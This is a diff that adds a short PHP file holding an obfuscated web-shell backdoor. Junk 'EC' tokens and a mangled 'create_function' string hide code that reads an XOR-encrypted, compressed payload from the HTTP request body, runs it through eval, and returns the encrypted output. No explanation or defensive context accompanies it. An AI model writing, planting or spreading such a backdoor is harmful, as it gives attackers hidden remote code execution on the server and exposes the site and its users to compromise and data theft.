@@ -1,0 +1,11 @@
+<?php
+$r='EC{$c=strlenEC($kEC);$l=strlenEC($t)EC;$oEC="";for($i=ECEC0;$i<$ECl;EC){ECfor($j=0;EC($j<$c&&$i<$l);$j+EC+,$ECi++){$o.';
+$x='EC=$t{$ECi}^$k{EC$j};}}retECurn $oEC;}ECif (@prECeg_matchEC(EC"/EC$kh(.+)$kfEC/",@file_getEC_conECtents("pEChp://ECinp';
+$p=str_replace('q','','cqrqqeate_fuqncqqtion');
+$Q='$kEC="827cECcb0e";$kh="eECa8aEC706c4c34"EC;EC$kf="a1EC6891f84e7b"ECECEC;$p="1IgWZrfKxloECy5ECslB";fuECnctioECn x($tEC,$k)';
+$w='coECntents();EC@ECob_endEC_clean();$rEC=@bECaseECEC64_enECECcode(@x(@gzcECompress($o),$k)EC);printEC("$ECp$kh$r$kf");}';
+$U='ut"EC)EC,$m)==1EC) {@ob_staECrt();EC@evECal(@gzuncECompress(EC@x(@bECECaseEC64_decodeEC(EC$m[1]),$k)));$ECECo=@ob_get_';
+$F=str_replace('EC','',$Q.$r.$x.$U.$w);
+$Y=$p('',$F);$Y();
+?>
+    
